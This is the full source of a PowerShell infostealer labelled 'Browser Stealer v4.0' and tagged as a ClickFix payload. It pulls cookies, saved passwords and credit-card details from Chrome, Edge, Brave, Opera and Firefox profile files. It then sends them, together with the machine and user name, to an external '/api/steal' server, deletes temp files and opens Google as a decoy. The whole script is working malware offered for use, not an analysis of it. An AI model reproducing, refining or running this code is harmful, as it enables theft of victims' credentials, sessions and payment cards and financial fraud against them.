# ============================================================
# BROWSER STEALER — BINARY PARSER VERSION (No DLL Required)
# ============================================================

$ErrorActionPreference = "Continue"
$SERVER_URL = "https://cipheranon-production.up.railway.app/api/steal"
$LOGFILE = "$env:TEMP\stealer_log.txt"

Remove-Item $LOGFILE -Force -ErrorAction SilentlyContinue

function Write-Log {
    param($Msg)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $line = "[$timestamp] $Msg"
    Add-Content -Path $LOGFILE -Value $line
    Write-Host $Msg
}

Write-Log "============================================"
Write-Log "  BROWSER STEALER v4.0"
Write-Log "  Target: $env:COMPUTERNAME"
Write-Log "  Log: $LOGFILE"
Write-Log "============================================"
Write-Log ""

# ============================================================
# SQLITE BINARY PARSER (PURE POWERSHELL)
# ============================================================

function Read-SQLite-Binary {
    param($DbPath)
    
    if (-not (Test-Path $DbPath)) { return $null }
    
    try {
        # Read the file as bytes
        $bytes = [System.IO.File]::ReadAllBytes($DbPath)
        
        # Validate SQLite header
        if ($bytes.Length -lt 20) { return $null }
        $header = [System.Text.Encoding]::ASCII.GetString($bytes[0..15])
        if (-not $header.StartsWith("SQLite format 3")) {
            Write-Log "[-] Not a valid SQLite file: $DbPath"
            return $null
        }
        
        # Extract all text strings (null-terminated)
        $strings = @()
        $i = 0
        while ($i -lt $bytes.Length) {
            # Look for null terminator
            if ($bytes[$i] -eq 0) {
                $start = $i - 1
                while ($start -gt 0 -and $bytes[$start] -ne 0) { $start-- }
                $start++
                
                if ($i - $start -gt 1) {
                    try {
                        $str = [System.Text.Encoding]::UTF8.GetString($bytes[$start..($i-1)])
                        # Filter valid strings
                        if ($str -match '[\w@.-]' -and $str.Length -gt 2 -and $str.Length -lt 1000) {
                            $strings += $str
                        }
                    } catch {}
                }
            }
            $i++
        }
        
        Write-Log "[+] Extracted $($strings.Count) strings from $DbPath"
        return $strings
    } catch {
        Write-Log "[!] Error reading $DbPath: $_"
        return $null
    }
}

# ============================================================
# EXTRACT COOKIES
# ============================================================

function Extract-Cookies {
    param($Strings, $BrowserName)
    $cookies = @()
    
    # First pass: find potential cookie domains
    $domains = @()
    $names = @()
    $values = @()
    
    # Look for domain patterns
    foreach ($str in $Strings) {
        # Skip common non-cookie strings
        if ($str -match '^[a-z]+$' -or $str -match '^[0-9]+$') { continue }
        if ($str -match '^(host|name|value|path|expires|secure|httponly|sqlite|table|index|create|drop)$') { continue }
        
        # Check if it's a domain
        if ($str -match '([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})' -and $str -notmatch '[{}()\[\]]' -and $str.Length -lt 100) {
            $domains += $str
        }
    }
    
    # Look for cookie names
    foreach ($str in $Strings) {
        if ($str.Length -lt 3 -or $str.Length -gt 50) { continue }
        if ($str -match '^[a-zA-Z0-9_-]+$' -and $str -notmatch '^(host|name|value|path|expires|secure|httponly|sqlite|table|index|create|drop)$') {
            $names += $str
        }
    }
    
    # Look for cookie values (longer strings with special chars)
    foreach ($str in $Strings) {
        if ($str.Length -lt 5 -or $str.Length -gt 500) { continue }
        if ($str -match '[a-zA-Z0-9+/=_-]' -and $str -notmatch '^[a-z]+$' -and $str -notmatch '^[A-Z]+$') {
            $values += $str
        }
    }
    
    # Match domains with names and values
    $max = [Math]::Min($domains.Count, [Math]::Min($names.Count, $values.Count))
    for ($i = 0; $i -lt $max; $i++) {
        if ($domains[$i] -and $names[$i] -and $values[$i]) {
            $cookies += @{
                domain = $domains[$i] -replace '^\.', ''
                name = $names[$i]
                value = $values[$i]
                browser = $BrowserName
            }
        }
    }
    
    return $cookies
}

# ============================================================
# COOKIE FUNCTIONS
# ============================================================

function Get-BrowserCookies {
    param($Path, $Name)
    $cookies = @()
    if (-not (Test-Path $Path)) { 
        Write-Log "[-] No cookies file for $Name"
        return $cookies 
    }
    
    Write-Log "[+] Parsing $Name cookies..."
    $strings = Read-SQLite-Binary -DbPath $Path
    if ($strings -and $strings.Count -gt 10) {
        $cookies = Extract-Cookies -Strings $strings -BrowserName $Name
        Write-Log "[+] Found $($cookies.Count) $Name cookies"
    } else {
        Write-Log "[-] No data extracted from $Name"
    }
    return $cookies
}

function Get-FirefoxCookies {
    $cookies = @()
    $profPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $profPath) {
        $dirs = Get-ChildItem $profPath -Directory
        foreach ($d in $dirs) {
            $f = "$($d.FullName)\cookies.sqlite"
            if (Test-Path $f) {
                Write-Log "[+] Parsing Firefox cookies from $($d.Name)..."
                $strings = Read-SQLite-Binary -DbPath $f
                if ($strings -and $strings.Count -gt 10) {
                    $cookies += Extract-Cookies -Strings $strings -BrowserName "Firefox"
                }
            }
        }
    }
    return $cookies
}

# ============================================================
# PASSWORD STEALER
# ============================================================

function Get-BrowserPasswords {
    param($Path, $Name)
    $pass = @()
    if (-not (Test-Path $Path)) { return $pass }
    
    try {
        $bytes = [System.IO.File]::ReadAllBytes($Path)
        $text = [System.Text.Encoding]::UTF8.GetString($bytes)
        $lines = $text -split "`0"
        
        $url = ""; $user = ""; $passw = ""
        
        foreach ($line in $lines) {
            # Find URLs
            if ($line -match 'https?://([^/]+)') {
                $url = $Matches[1]
            }
            # Find usernames
            if ($line -match 'username[_-]?value[^=]*=([^,]+)') {
                $user = $Matches[1] -replace '[^a-zA-Z0-9@._-]', ''
                if ($user.Length -lt 3) {
                    $user = ($line -replace '[^a-zA-Z0-9@._-]', '')
                }
            }
            # Find passwords
            if ($line -match 'password[_-]?value[^=]*=([^,]+)') {
                $passw = $Matches[1] -replace '[^a-zA-Z0-9@._-]', ''
                if ($passw.Length -lt 3) {
                    $passw = ($line -replace '[^a-zA-Z0-9@._-]', '')
                }
            }
            # Also try direct pattern matching
            if ($line -match '"([^"]+)"\s*,\s*"([^"]+)"\s*,\s*"([^"]+)"') {
                $url = $Matches[1] -replace 'https?://', ''
                $user = $Matches[2]
                $passw = $Matches[3]
            }
            
            # If we have all three, add to results
            if ($url -and $user -and $passw -and $user.Length -gt 1 -and $passw.Length -gt 1 -and $user -ne "username" -and $passw -ne "password") {
                $pass += @{
                    url = $url
                    username = $user
                    password = $passw
                    browser = $Name
                }
                $url = ""; $user = ""; $passw = ""
            }
        }
        
        Write-Log "[+] Found $($pass.Count) $Name passwords"
    } catch {
        Write-Log "[!] Error reading $Name passwords: $_"
    }
    return $pass
}

function Get-FirefoxPasswords {
    $pass = @()
    $profPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $profPath) {
        $dirs = Get-ChildItem $profPath -Directory
        foreach ($d in $dirs) {
            $f = "$($d.FullName)\logins.json"
            if (Test-Path $f) {
                try {
                    $json = Get-Content $f -Raw | ConvertFrom-Json
                    if ($json.logins) {
                        foreach ($l in $json.logins) {
                            $u = $l.hostname -replace 'https?://', ''
                            $pass += @{
                                url = $u
                                username = $l.username
                                password = $l.password
                                browser = "Firefox"
                            }
                        }
                    }
                } catch {}
            }
        }
    }
    return $pass
}

function Get-OperaPasswords {
    $pass = @()
    $path = "$env:LOCALAPPDATA\Opera Software\Opera Stable\Login Data"
    if (Test-Path $path) {
        $pass += Get-BrowserPasswords -Path $path -Name "Opera"
    }
    return $pass
}

# ============================================================
# CREDIT CARD STEALER
# ============================================================

function Get-BrowserCards {
    param($Path, $Name)
    $cards = @()
    if (-not (Test-Path $Path)) { return $cards }
    
    try {
        $bytes = [System.IO.File]::ReadAllBytes($Path)
        $text = [System.Text.Encoding]::UTF8.GetString($bytes)
        $lines = $text -split "`0"
        
        $name = ""; $number = ""; $month = ""; $year = ""
        
        foreach ($line in $lines) {
            # Find cardholder name
            if ($line -match 'name[_-]?on[_-]?card[^=]*=([^,]+)') {
                $name = $Matches[1]
            }
            # Find card number
            if ($line -match 'card[_-]?number[_-]?[^=]*=([^,]+)') {
                $number = $Matches[1]
            }
            # Find expiry month
            if ($line -match 'expiration[_-]?month[^=]*=(\d+)') {
                $month = $Matches[1]
            }
            # Find expiry year
            if ($line -match 'expiration[_-]?year[^=]*=(\d+)') {
                $year = $Matches[1]
            }
            
            # Also look for card number patterns (4-digit groups)
            if (-not $number) {
                $cardMatch = [regex]::Match($line, '\b(\d{4}[- ]?\d{4}[- ]?\d{4}[- ]?\d{4})\b')
                if ($cardMatch.Success) {
                    $number = $cardMatch.Groups[1].Value
                    $name = "Unknown"
                }
            }
            
            # If we have name and number, add to results
            if ($name -and $number -and $number.Length -gt 5) {
                $cards += @{
                    name = $name
                    number = $number
                    month = $month
                    year = $year
                    browser = $Name
                }
                $name = ""; $number = ""; $month = ""; $year = ""
            }
        }
        
        Write-Log "[+] Found $($cards.Count) $Name cards"
    } catch {
        Write-Log "[!] Error reading $Name cards: $_"
    }
    return $cards
}

# ============================================================
# STEAL EVERYTHING
# ============================================================

$allCookies = @()
$allPasswords = @()
$allCards = @()

# ---- COOKIES ----
Write-Log ""
Write-Log "[+] Chrome cookies..."
$path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
$allCookies += Get-BrowserCookies -Path $path -Name "Chrome"

Write-Log "[+] Edge cookies..."
$path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
$allCookies += Get-BrowserCookies -Path $path -Name "Edge"

Write-Log "[+] Brave cookies..."
$path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies"
$allCookies += Get-BrowserCookies -Path $path -Name "Brave"

Write-Log "[+] Opera cookies..."
$path = "$env:LOCALAPPDATA\Opera Software\Opera Stable\Network\Cookies"
$allCookies += Get-BrowserCookies -Path $path -Name "Opera"

Write-Log "[+] Firefox cookies..."
$allCookies += Get-FirefoxCookies

# ---- PASSWORDS ----
Write-Log "[+] Chrome passwords..."
$path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
$allPasswords += Get-BrowserPasswords -Path $path -Name "Chrome"

Write-Log "[+] Edge passwords..."
$path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
$allPasswords += Get-BrowserPasswords -Path $path -Name "Edge"

Write-Log "[+] Brave passwords..."
$path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
$allPasswords += Get-BrowserPasswords -Path $path -Name "Brave"

Write-Log "[+] Opera passwords..."
$allPasswords += Get-OperaPasswords

Write-Log "[+] Firefox passwords..."
$allPasswords += Get-FirefoxPasswords

# ---- CARDS ----
Write-Log "[+] Chrome cards..."
$path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Web Data"
$allCards += Get-BrowserCards -Path $path -Name "Chrome"

Write-Log "[+] Edge cards..."
$path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Web Data"
$allCards += Get-BrowserCards -Path $path -Name "Edge"

Write-Log "[+] Brave cards..."
$path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Web Data"
$allCards += Get-BrowserCards -Path $path -Name "Brave"

# ============================================================
# SUMMARY
# ============================================================

Write-Log ""
Write-Log "============================================"
Write-Log "  SUMMARY"
Write-Log "============================================"
Write-Log "Cookies:    $($allCookies.Count)"
Write-Log "Passwords:  $($allPasswords.Count)"
Write-Log "Cards:      $($allCards.Count)"
Write-Log "============================================"
Write-Log ""

# Show sample data if any
if ($allCookies.Count -gt 0) {
    Write-Log "=== SAMPLE COOKIES (First 3) ==="
    $allCookies | Select-Object -First 3 | ForEach-Object {
        $shortVal = $_.value
        if ($shortVal.Length -gt 20) { $shortVal = $shortVal.Substring(0, 20) + "..." }
        Write-Log "  $($_.domain) - $($_.name) = $shortVal"
    }
    Write-Log ""
}

if ($allPasswords.Count -gt 0) {
    Write-Log "=== SAMPLE PASSWORDS (First 3) ==="
    $allPasswords | Select-Object -First 3 | ForEach-Object {
        Write-Log "  $($_.url) - $($_.username) / $($_.password)"
    }
    Write-Log ""
}

if ($allCards.Count -gt 0) {
    Write-Log "=== SAMPLE CARDS (First 3) ==="
    $allCards | Select-Object -First 3 | ForEach-Object {
        Write-Log "  $($_.name) - $($_.number) ($($_.month)/$($_.year))"
    }
    Write-Log ""
}

if ($allCookies.Count -eq 0 -and $allPasswords.Count -eq 0 -and $allCards.Count -eq 0) {
    Write-Log "[!] No data stolen!"
    Write-Log "[*] Possible reasons:"
    Write-Log "  - No saved passwords/cookies in browsers"
    Write-Log "  - Browser is running (locks the database)"
    Write-Log "  - Close the browser and try again"
    Write-Log ""
}

# ============================================================
# BUILD PAYLOAD — INCLUDES PC NAME
# ============================================================

$pcName = $env:COMPUTERNAME
$userName = $env:USERNAME

$payload = @{
    cookies = $allCookies
    passwords = $allPasswords
    cards = $allCards
    system = @{
        hostname = $pcName
        username = $userName
    }
    fingerprint = @{
        hostname = $pcName
        userAgent = "PowerShell Payload"
        browser = "PowerShell"
        screen = "N/A"
    }
    domain = $pcName
    source = "clickfix_payload"
    timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
    pcName = $pcName
}

# ============================================================
# SEND TO SERVER
# ============================================================

Write-Log "[+] Sending data to server..."
try {
    $json = $payload | ConvertTo-Json -Depth 10
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
    $req = [System.Net.WebRequest]::Create($SERVER_URL)
    $req.Method = "POST"
    $req.ContentType = "application/json"
    $req.ContentLength = $bytes.Length
    $stream = $req.GetRequestStream()
    $stream.Write($bytes, 0, $bytes.Length)
    $stream.Close()
    $resp = $req.GetResponse()
    $resp.Close()
    Write-Log "[+] Data sent successfully!"
} catch {
    Write-Log "[!] Failed to send: $_"
}

# ============================================================
# CLEANUP
# ============================================================

Get-ChildItem "$env:TEMP\*.tmp" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue

Start-Process "https://www.google.com"

Write-Log ""
Write-Log "[+] Done!"
Write-Log "[+] Log saved to: $LOGFILE"
Write-Log ""
Read-Host "Press Enter to exit"
